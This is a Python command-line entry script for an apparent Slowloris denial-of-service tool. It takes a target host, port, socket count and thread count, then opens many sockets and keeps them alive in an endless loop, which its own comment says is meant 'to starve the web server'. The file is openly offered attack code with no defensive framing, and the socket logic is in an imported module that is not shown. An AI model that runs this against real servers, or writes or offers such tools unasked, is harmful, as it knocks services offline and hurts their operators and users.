import argparse
import logging
from . import logger
from .slowloris import SlowLoris


def main():
    try:
        # Parsing the arguments
        parser = argparse.ArgumentParser()
        parser.add_argument('host')
        parser.add_argument('--sock_count', default=200, type=int)
        parser.add_argument('--thread_count', default=5, type=int)
        parser.add_argument('--port', default=80, type=int)
        parser.add_argument('--verbose', default=False, type=bool)
        args = parser.parse_args()

        # Verbose logging for debugs
        if args.verbose is True:
            logger.setLevel(logging.DEBUG)

        # Initialize the SlowLoris object
        with SlowLoris((args.host, args.port), args.sock_count, args.thread_count) as slowloris:
            slowloris.connect_sockets()

            # Keep all the sockets alive to starve the web server
            while True:
                slowloris.keep_alive()
    except KeyboardInterrupt:
        print('Interrupt received, shutting down...')
    except Exception as e:
        logger.error(e.msg)


if __name__ == '__main__':
    main()
